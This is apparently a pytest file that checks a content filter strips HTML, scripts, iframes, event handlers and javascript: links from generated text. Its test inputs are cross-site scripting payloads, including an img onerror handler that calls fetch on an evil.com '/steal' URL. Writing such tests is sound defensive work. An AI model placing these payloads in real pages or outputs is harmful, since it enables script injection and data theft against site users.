"""ContentGen XSS-in-output security tests.

Verifies that generated text is stripped of HTML/script before storage or display.
"""

import pytest
from agents.content_gen.generator import ContentSafetyFilter


class TestContentGenXSS:
    def test_strips_script_tags(self):
        output = 'Here is your answer: <script>alert("xss")</script>'
        clean = ContentSafetyFilter.sanitize_output(output)
        assert "script" not in clean
        assert "alert" not in clean
        assert "Here is your answer" in clean

    def test_strips_iframe_tags(self):
        output = 'Study notes <iframe src="https://evil.com"></iframe> end'
        clean = ContentSafetyFilter.sanitize_output(output)
        assert "iframe" not in clean
        assert "evil" not in clean

    def test_strips_all_html_tags(self):
        output = "<h1>Title</h1><p>Content with <b>bold</b> and <i>italic</i></p>"
        clean = ContentSafetyFilter.sanitize_output(output)
        assert "<h1>" not in clean
        assert "<p>" not in clean
        assert "<b>" not in clean
        assert "<i>" not in clean
        # Text content survives
        assert "Title" in clean
        assert "Content with" in clean
        assert "bold" in clean
        assert "italic" in clean

    def test_blocks_event_handler_attributes(self):
        output = '<img src=x onerror="fetch(\'https://evil.com/steal\')">'
        clean = ContentSafetyFilter.sanitize_output(output)
        assert "onerror" not in clean
        assert "fetch" not in clean
        assert "evil" not in clean

    def test_blocks_javascript_href(self):
        output = '<a href="javascript:alert(1)">Click me</a>'
        clean = ContentSafetyFilter.sanitize_output(output)
        assert "javascript" not in clean
        assert "alert" not in clean
        assert "Click me" in clean

    def test_sanitize_preserves_safe_content(self):
        output = "Normal text with 3 < 5 (not HTML) and -> arrow"
        clean = ContentSafetyFilter.sanitize_output(output)
        assert "Normal text" in clean
        assert "3 < 5" in clean
        assert "->" in clean

    def test_nested_html_blocks(self):
        output = "<div><span><script>evil()</script></span></div>"
        clean = ContentSafetyFilter.sanitize_output(output)
        assert "script" not in clean
        assert "evil" not in clean
        assert "div" not in clean

    def test_markdown_content_preserved(self):
        output = "## Title\n\n**bold** and `code` and [link](https://safe.com)"
        clean = ContentSafetyFilter.sanitize_output(output)
        # Markdown symbols are preserved (not HTML)
        assert "##" in clean
        assert "**" in clean
        assert "`" in clean

    def test_empty_output_returns_empty(self):
        assert ContentSafetyFilter.sanitize_output("") == ""

    def test_plain_text_unchanged(self):
        text = "Photosynthesis converts light energy into chemical energy."
        assert ContentSafetyFilter.sanitize_output(text) == text
